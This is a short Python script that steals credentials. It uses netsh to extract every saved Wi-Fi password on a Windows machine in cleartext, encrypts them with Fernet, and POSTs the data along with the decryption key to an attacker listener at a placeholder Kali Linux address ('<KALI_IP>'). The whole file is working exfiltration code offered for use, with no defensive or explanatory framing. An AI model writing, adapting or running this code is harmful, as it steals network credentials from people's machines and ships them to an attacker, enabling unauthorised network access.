import subprocess
from cryptography.fernet import Fernet
import requests
import json

# Function to extract Wi-Fi passwords
def extract_wifi_passwords():
    try:
        # Get all Wi-Fi profiles
        profiles = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True).stdout
        profile_names = [line.split(":")[1].strip() for line in profiles.splitlines() if "All User Profile" in line]

        # Extract passwords for each profile
        wifi_data = ""
        for profile in profile_names:
            result = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True, text=True).stdout
            password_lines = [line.split(":")[1].strip() for line in result.splitlines() if "Key Content" in line]
            password = password_lines[0] if password_lines else "No Password"
            wifi_data += f"SSID: {profile}, Password: {password}\n"

        return wifi_data
    except Exception as e:
        return f"Error: {e}"

# Function to encrypt data
def encrypt_data(data, key):
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data.encode())
    return encrypted_data

# Function to send data to the server
def send_data_to_kali(encrypted_data, key, url):
    try:
        # Create a payload with the encrypted data and the key
        payload = {
            "encrypted_data": encrypted_data.decode(),  # Convert bytes to string for JSON
            "key": key.decode()  # Convert bytes to string for JSON
        }
        # Send the payload as JSON
        response = requests.post(url, json=payload)
        return response.text
    except Exception as e:
        return f"Error sending data: {e}"

# Main script
if __name__ == "__main__":
    # Generate an encryption key
    key = Fernet.generate_key()

    # Extract Wi-Fi passwords
    wifi_data = extract_wifi_passwords()
    print("Extracted Wi-Fi Passwords:\n", wifi_data)

    # Encrypt the data
    encrypted_data = encrypt_data(wifi_data, key)
    print("Encrypted Data:", encrypted_data)

    # Send the encrypted data and key to the server
    kali_url = "http://<KALI_IP>:5000/receive"  # Replace <KALI_IP> with your Kali Linux IP
    response = send_data_to_kali(encrypted_data, key, kali_url)
    print("Server Response:", response)

    # Save the key to a file (for decryption on the server)
    with open("encryption_key.key", "wb") as key_file:
        key_file.write(key)
    print("Encryption key saved to 'encryption_key.key'. Transfer this file to the server for decryption.")
